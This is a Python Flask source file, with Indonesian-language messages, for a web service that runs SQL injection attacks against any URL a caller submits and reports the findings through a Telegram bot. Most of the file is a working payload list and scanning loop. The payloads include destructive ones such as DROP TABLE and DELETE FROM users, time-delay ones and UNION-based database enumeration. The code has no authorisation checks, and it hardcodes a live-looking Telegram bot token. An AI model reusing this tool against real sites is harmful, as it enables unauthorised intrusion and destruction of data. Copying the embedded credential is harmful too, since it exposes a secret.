from flask import Flask, request, jsonify
import requests
import urllib.parse
import time
import threading
import re

app = Flask(__name__)

BOT_TOKEN = "8419027805:AAFwqpHo_m80CQ02xxJRCxNuWb42ZgPi0iQ"

sql_errors = [
    "mysql_fetch", "sql syntax", "mysql_error", "mysql_num_rows", "mysqli_fetch",
    "Microsoft OLE DB", "Microsoft JET", "ODBC Driver", "ORA-", "PostgreSQL",
    "SQLite", "division by zero", "unclosed quotation mark", "you have an error in your SQL",
    "warning: mysql", "supplied argument is not a valid MySQL", "Uncaught mysqli_sql_exception",
    "Incorrect syntax near", "Unclosed quotation mark", "OLE DB", "Microsoft Access Driver",
    "JET Database", "Syntax error in query", "Query failed", "Database error",
    "SQL command not properly ended", "ORA-00933", "ORA-01756", "PLS-00306",
    "INVALID SQL STATEMENT", "PostgreSQL query failed", "pg_query()", "pg_exec()",
    "invalid input syntax", "SQLite3::query():", "unable to open database",
    "database disk image is malformed", "SQL logic error", "foreign key constraint failed",
    "UNIQUE constraint failed", "CHECK constraint failed", "NOT NULL constraint failed",
    "PRIMARY KEY must be unique", "ORDER BY position", "Column not found", "Unknown column",
    "Table doesn't exist", "Duplicate entry", "Data too long", "Out of range value",
    "Incorrect integer value", "Incorrect double value", "Incorrect datetime value",
    "Incorrect date value", "Incorrect time value", "Incorrect year value",
    "SQLSTATE[42000]", "SQLSTATE[42S02]", "SQLSTATE[42S22]", "SQLSTATE[23000]"
]

payloads = [
    "'", '"', "\\'", '\\"', "' OR '1'='1", '" OR "1"="1', "' OR 1=1--", '" OR 1=1--',
    "' OR 1=1#", "' OR 1=1/*", "' OR '1'='1'--", "' OR '1'='1'#", "' OR '1'='1'/*",
    "' AND 1=1--", "' AND 1=2--", "' AND '1'='1", "' AND '1'='2", "' AND 1=1#",
    "' UNION SELECT 1--", "' UNION SELECT 1,2--", "' UNION SELECT 1,2,3--",
    "' UNION SELECT 1,2,3,4--", "' UNION SELECT 1,2,3,4,5--", "' UNION SELECT 1,2,3,4,5,6--",
    "' UNION SELECT 1,2,3,4,5,6,7--", "' UNION SELECT 1,2,3,4,5,6,7,8--",
    "' UNION SELECT 1,2,3,4,5,6,7,8,9--", "' UNION SELECT 1,2,3,4,5,6,7,8,9,10--",
    "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--", "' UNION SELECT NULL,NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL,NULL--", "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
    "' ORDER BY 1--", "' ORDER BY 2--", "' ORDER BY 3--", "' ORDER BY 4--", "' ORDER BY 5--",
    "' ORDER BY 6--", "' ORDER BY 7--", "' ORDER BY 8--", "' ORDER BY 9--", "' ORDER BY 10--",
    "' ORDER BY 11--", "' ORDER BY 12--", "' ORDER BY 13--", "' ORDER BY 14--", "' ORDER BY 15--",
    "' ORDER BY 16--", "' ORDER BY 17--", "' ORDER BY 18--", "' ORDER BY 19--", "' ORDER BY 20--",
    "' ORDER BY 50--", "' ORDER BY 100--", "' ORDER BY 500--", "' ORDER BY 1000--",
    "';--", "'; DROP TABLE users--", "'; DELETE FROM users--", "'; INSERT INTO admin values--",
    "' WAITFOR DELAY '0:0:5'--", "' WAITFOR DELAY '0:0:3'--", "' OR SLEEP(5)--", "' AND SLEEP(5)--",
    "' OR SLEEP(3)--", "' AND SLEEP(3)--", "' OR pg_sleep(5)--", "' AND pg_sleep(5)--",
    "' OR pg_sleep(3)--", "' AND pg_sleep(3)--", "' OR BENCHMARK(10000000,MD5('a'))--",
    "' AND BENCHMARK(10000000,MD5('a'))--", "' UNION SELECT @@version--", "' UNION SELECT version()--",
    "' UNION SELECT user()--", "' UNION SELECT database()--", "' UNION SELECT current_user--",
    "' UNION SELECT current_database()--", "' UNION SELECT table_name FROM information_schema.tables--",
    "' UNION SELECT column_name FROM information_schema.columns--",
    "' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database()--",
    "' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--",
    "' AND 1=0 UNION SELECT 1,2,3--", "' AND 1=0 UNION SELECT 1,2,3,4--",
    "' AND 1=0 UNION SELECT 1,2,3,4,5--", "' AND 1=0 UNION SELECT NULL,NULL,NULL--",
    "' AND 1=0 UNION SELECT 1,@@version,3--", "' AND 1=0 UNION SELECT 1,user(),3--",
    "' AND 1=0 UNION SELECT 1,database(),3--", "' AND 1=0 UNION SELECT 1,version(),3--",
    "%27", "%22", "%23", "\\x27", "\\x22", "'||'1'='1", "'&&'1'='1", "'|'1'='1",
    "'&'1'='1", "'^'1'='1", "'*'1'='1", "'/'1'='1", "'%'1'='1", "' MOD '1'='1",
    "' DIV '1'='1", "' SOUNDS LIKE '1'='1", "' REGEXP '1'='1", "' RLIKE '1'='1",
    "' NOT LIKE '1'='1", "' BETWEEN 1 AND 1--", "' IN (1)--", "' NOT IN (1)--",
    "' EXISTS (SELECT 1)--", "' NOT EXISTS (SELECT 1)--", "' IS NULL--", "' IS NOT NULL--",
    "' IS TRUE--", "' IS FALSE--", "' IS UNKNOWN--", "' IS NOT UNKNOWN--"
]

def send_telegram(chat_id, text):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        requests.post(url, json={
            'chat_id': chat_id,
            'text': text,
            'parse_mode': 'Markdown'
        }, timeout=10)
    except:
        pass

def send_file(chat_id, content, filename):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
        files = {'document': (filename, content, 'text/plain')}
        data = {'chat_id': chat_id}
        requests.post(url, data=data, files=files, timeout=30)
    except:
        pass

def scan_target(target_url, chat_id):
    results = []
    vulnerable_params = []
    db_info = {}
    start_time = time.time()
    scanned = 0
    
    send_telegram(chat_id, 
        f"💉 *INJECTION SCANNER DIMULAI*\n\n"
        f"🎯 Target: `{target_url}`\n"
        f"📊 Payload: {len(payloads)}+\n"
        f"⏱️ Estimasi: 2-3 menit\n\n"
        f"_Hasil akan dikirim otomatis_"
    )
    
    try:
        parsed = urllib.parse.urlparse(target_url)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        query_params = urllib.parse.parse_qs(parsed.query)
        param_names = list(query_params.keys())
        
        if not param_names:
            send_telegram(chat_id, "❌ Tidak ada parameter query")
            return
        
        total_tests = len(payloads) * len(param_names)
        
        for param in param_names:
            original_value = query_params[param][0]
            
            for i in range(0, len(payloads), 5):
                batch = payloads[i:i+5]
                
                for payload in batch:
                    scanned += 1
                    test_url = f"{base_url}?{param}={urllib.parse.quote(original_value + payload)}"
                    
                    try:
                        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
                        resp = requests.get(test_url, headers=headers, timeout=5, verify=False)
                        
                        if resp.status_code == 200:
                            html = resp.text.lower()
                            
                            for error in sql_errors:
                                if error.lower() in html:
                                    results.append({
                                        'param': param,
                                        'payload': payload,
                                        'type': 'Error-based',
                                        'evidence': error,
                                        'url': test_url
                                    })
                                    if param not in vulnerable_params:
                                        vulnerable_params.append(param)
                                    break
                            
                            if not db_info.get('type'):
                                if 'mysql' in html:
                                    db_info['type'] = 'MySQL'
                                elif 'postgresql' in html or 'postgres' in html:
                                    db_info['type'] = 'PostgreSQL'
                                elif 'sqlite' in html:
                                    db_info['type'] = 'SQLite'
                                elif 'mssql' in html or 'sql server' in html:
                                    db_info['type'] = 'MSSQL'
                                elif 'oracle' in html:
                                    db_info['type'] = 'Oracle'
                    except:
                        pass
                    
                    if scanned % 50 == 0:
                        progress = int((scanned / total_tests) * 100)
                        send_telegram(chat_id,
                            f"📊 *Progress: {progress}%*\n"
                            f"✅ Ditemukan: {len(results)} kerentanan\n"
                            f"⏱️ Waktu: {int(time.time()-start_time)} detik"
                        )
        
        duration = int(time.time() - start_time)
        
        if not results:
            send_telegram(chat_id,
                f"✅ *SCAN SELESAI - AMAN*\n\n"
                f"🎯 Target: `{target_url}`\n"
                f"📊 Payload: {scanned}\n"
                f"⏱️ Waktu: {duration} detik\n"
                f"❌ Tidak ditemukan kerentanan SQL injection."
            )
            return
        
        report = f"💉 *SQL INJECTION SCAN REPORT*\n"
        report += f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        report += f"🎯 Target: `{target_url}`\n"
        report += f"📊 Payload diuji: {scanned}\n"
        report += f"⏱️ Waktu: {duration} detik\n"
        report += f"🔥 Kerentanan: {len(results)}\n"
        report += f"⚠️ Parameter: {', '.join(vulnerable_params)}\n\n"
        
        if db_info.get('type'):
            report += f"*🛢️ DATABASE INFO*\n"
            report += f"└ Type: {db_info['type']}\n\n"
        
        for i, r in enumerate(results[:10]):
            report += f"*{i+1}. {r['type']}*\n"
            report += f"└ Parameter: {r['param']}\n"
            report += f"└ Payload: `{r['payload']}`\n"
            report += f"└ Evidence: {r['evidence'][:50]}\n\n"
        
        if len(results) > 10:
            report += f"_... dan {len(results)-10} kerentanan lainnya_\n\n"
        
        send_telegram(chat_id, report)
        
        file_content = f"SQL INJECTION SCAN REPORT\n"
        file_content += f"{'='*50}\n"
        file_content += f"Target: {target_url}\n"
        file_content += f"Date: {time.strftime('%Y-%m-%d %H:%M:%S')}\n"
        file_content += f"Payloads tested: {scanned}\n"
        file_content += f"Vulnerabilities: {len(results)}\n"
        file_content += f"Parameters: {', '.join(vulnerable_params)}\n"
        file_content += f"{'='*50}\n\n"
        
        for r in results:
            file_content += f"[{r['type']}]\n"
            file_content += f"Parameter: {r['param']}\n"
            file_content += f"Payload: {r['payload']}\n"
            file_content += f"Evidence: {r['evidence']}\n"
            file_content += f"URL: {r['url']}\n"
            file_content += f"{'-'*50}\n\n"
        
        send_file(chat_id, file_content, f"sql_{int(time.time())}.txt")
        
    except Exception as e:
        send_telegram(chat_id, f"❌ Error: {str(e)}")

@app.route('/')
def home():
    return "SQL Injection API is running!"

@app.route('/scan')
def scan():
    url = request.args.get('url')
    chat_id = request.args.get('chat_id')
    
    if not url or not chat_id:
        return jsonify({"error": "Parameter url dan chat_id required"}), 400
    
    # Jalankan di background thread
    thread = threading.Thread(target=scan_target, args=(url, chat_id))
    thread.start()
    
    return jsonify({
        "status": "accepted",
        "message": f"Scan dimulai untuk {url}"
    })

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
